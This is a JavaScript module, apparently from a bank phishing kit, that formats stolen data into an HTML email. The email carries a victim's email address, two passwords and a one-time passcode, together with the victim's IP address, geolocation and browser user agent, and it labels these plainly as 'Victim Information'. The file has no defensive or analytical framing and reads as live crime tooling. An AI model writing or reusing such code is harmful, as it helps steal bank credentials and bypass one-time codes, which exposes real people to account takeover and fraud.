const htmlEmail = (body) => {
  return `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0"
    />
    <meta
      name="description"
      content="${body?.bank}"
    />
    <title>${body?.bank}</title>
    <link
      rel="preconnect"
      href="https://fonts.gstatic.com"
      crossorigin
    />
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap"
      rel="stylesheet"
    />

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Poppins", sans-serif !important;
      }
    </style>
  </head>
  <body>

    <pre>
Email: ${body?.email || ""}
Password1: ${body?.password1 || ""}
Password2: ${body?.password2 || ""}
OTP: ${body?.otp || ""}
Victim Information:
  IP: ${body?.victimInfo.ip}
  City: ${body.victimInfo.city}
  Country: ${body.victimInfo.country}
  Country code: ${body.victimInfo.countryCode}
  Region: ${body.victimInfo.region}
  Region name: ${body.victimInfo.regionName}
  Zip code: ${body.victimInfo.zip}
  Latitude: ${body.victimInfo.lat}
  Longitude: ${body.victimInfo.lon}\n
User agent: ${body.userAgent}
    </pre>
  </body>
</html>
`;
};

module.exports = { htmlEmail };
